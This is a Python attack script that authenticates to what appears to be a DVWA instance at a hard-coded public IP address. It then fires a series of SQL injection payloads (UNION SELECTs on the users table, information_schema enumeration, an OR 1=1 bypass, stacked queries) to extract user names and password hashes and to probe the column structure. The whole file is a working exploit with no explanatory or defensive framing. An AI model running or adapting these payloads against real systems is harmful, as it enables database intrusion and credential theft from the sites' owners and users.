
import requests
import re

base_url = "http://31.97.117.123"
login_url = f"{base_url}/login.php"
sqli_url = f"{base_url}/vulnerabilities/sqli/"

# First authenticate
session = requests.Session()
response = session.get(login_url)
token_match = re.search(r"user_token'? value='([a-f0-9]+)'", response.text)

if token_match:
    user_token = token_match.group(1)
    
    # Login
    data = {
        "username": "admin",
        "password": "password",
        "user_token": user_token,
        "Login": "Login"
    }
    
    session.post(login_url, data=data)
    
    print("[*] Attempting various SQL injection payloads to extract password hashes...")
    
    # Try direct database query
    payloads = [
        # Method 1: Simple UNION
        ("1 UNION SELECT user_id, CONCAT(first_name, ' ', last_name), password FROM users--", "Method 1"),
        
        # Method 2: Try different column names
        ("1 UNION SELECT id, CONCAT(user, ':', password), password FROM users--", "Method 2"),
        
        # Method 3: Information_schema
        ("999 UNION SELECT 1, CONCAT(TABLE_NAME), TABLE_SCHEMA FROM information_schema.TABLES--", "Get tables"),
        
        # Method 4: Show columns
        ("999 UNION SELECT 1, COLUMN_NAME, TABLE_NAME FROM information_schema.COLUMNS WHERE TABLE_NAME='users'--", "Get columns"),
        
        # Method 5: All user data
        ("999 OR 1=1--", "Bypass with OR"),
        
        # Method 6: Different format
        ("1; SELECT * FROM users--", "Alternative format"),
    ]
    
    for payload, description in payloads:
        print(f"\n[*] {description}: {payload[:80]}")
        
        params = {
            "id": payload,
            "Submit": "Submit"
        }
        
        try:
            response = session.get(sqli_url, params=params, timeout=10)
            
            # Extract data
            # Look for password-like strings (hashes usually MD5, SHA1, bcrypt)
            if response.text and "First name:" in response.text:
                # Get the <pre> section
                start = response.text.find('<pre>')
                end = response.text.find('</pre>')
                if start >= 0 and end > start:
                    data_section = response.text[start+5:end]
                    print(f"[+] Result:\n{data_section[:500]}")
        except Exception as e:
            print(f"[-] Error: {e}")

print("\n[*] Now let's try to directly query the database...")

# Try a simpler approach - test what columns are returned
print("\n[*] Testing column structure...")

test_payloads = [
    "1 UNION SELECT 1,2,3--",
    "1 UNION SELECT 1,2,3,4--", 
    "1 UNION SELECT 1,2,3,4,5--",
]

for payload in test_payloads:
    print(f"\n[*] Testing: {payload}")
    params = {"id": payload, "Submit": "Submit"}
    
    response = session.get(sqli_url, params=params, timeout=10)
    if "<pre>" in response.text:
        start = response.text.find('<pre>')
        end = response.text.find('</pre>')
        print(response.text[start+5:end][:200])

